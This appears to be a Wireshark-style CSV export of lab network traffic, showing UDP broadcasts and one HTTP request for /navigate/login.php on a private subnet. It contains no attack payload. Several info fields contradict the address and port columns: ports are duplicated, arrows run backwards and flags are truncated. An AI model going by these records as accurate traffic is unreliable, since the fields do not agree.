Nov 21, 2021 01:22:49.844173000 SE Asia Standard Time;192.168.111.255;192.168.111.1;54915;54915;UDP;305;54915 > 54915 LEN=271
Nov 21, 2021 01:23:32.845091000 SE Asia Standard Time;192.168.111.255;192.168.111.1;54915;54915;UDP;305;54915 > 54915 LEN=271
Nov 21, 2021 01:23:33.843298000 SE Asia Standard Time;192.168.111.255;192.168.111.1;54915;54915;UDP;305;54915 > 54915 LEN=271
Nov 21, 2021 01:23:34.470817000 SE Asia Standard Time;192.168.111.136;192.168.111.132;42681;80;tcp;74;42681 > 42681 [SYN] Seq=0 Win=64240 LEN=0
Nov 21, 2021 01:23:34.471159000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;42681;tcp;74;42681 > 80 [SYN, ACK] Seq=0 Ack=1 Win=65160 LEN=0
Nov 21, 2021 01:23:34.471312000 SE Asia Standard Time;192.168.111.136;192.168.111.132;42681;80;tcp;66;80 > 42681 [ACK] Seq=1 Ack=1 Win=64256 LEN=0
Nov 21, 2021 01:23:34.471867000 SE Asia Standard Time;192.168.111.136;192.168.111.132;42681;80;http;189;Layer HTTP: 	GET /navigate/login.php HTTP/1.1\r\n 	Expert Info (Chat/Sequence): GET /navigate/login.php HTTP/1.1\r\n 	GET /navigate/login.php HTTP/1.1\r\n 	Severity level: Chat 	Group: Sequence 	Request Method: GET 	Request URI: /navigate/login.php 	Request Version: HTTP/1.1 	Host: 192.168.111.136\r\n 	User-Agent: Mozilla/4.0 (compatible MSIE 6.0 Windows NT 5.1)\r\n 	Full request URI: http://192.168.111.136/navigate/login.php 	HTTP request 1/1 	\r\n 
Nov 21, 2021 01:23:34.472111000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;42681;tcp;66;42681 > 80 [ACK] Seq=1 Ack=124 Win=65152 LEN=0
Nov 21, 2021 01:23:34.477553000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;42681;tcp;1514;42681 > 80 [ACK] Seq=1 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:23:34.477563000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;42681;tcp;1514;42681 > 80 [ACK] Seq=1449 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:23:34.477567000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;42681;tcp;1514;42681 > 80 [ACK] Seq=2897 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:23:34.477573000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;42681;tcp;1514;42681 > 80 [ACK] Seq=4345 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:23:34.477580000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;42681;tcp;1514;42681 > 80 [PUS, ACK] Seq=5793 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:23:34.477669000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;42681;tcp;1514;42681 > 80 [ACK] Seq=7241 Ack=124 Win=65152 LEN=1448
Nov 21, 2021 01:23:34.477675000 SE Asia Standard Time;192.168.111.132;192.168.111.136;80;42681;tcp;322;42681 > 80 [PUS, ACK] Seq=8689 Ack=124 Win=65152 LEN=256
Nov 21, 2021 01:23:34.477920000 SE Asia Standard Time;192.168.111.136;192.168.111.132;42681;80;tcp;66;80 > 42681 [ACK] Seq=124 Ack=7241 Win=60672 LEN=0
Nov 21, 2021 01:23:34.477957000 SE Asia Standard Time;192.168.111.136;192.168.111.132;42681;80;tcp;66;80 > 42681 [ACK] Seq=124 Ack=8945 Win=59008 LEN=0
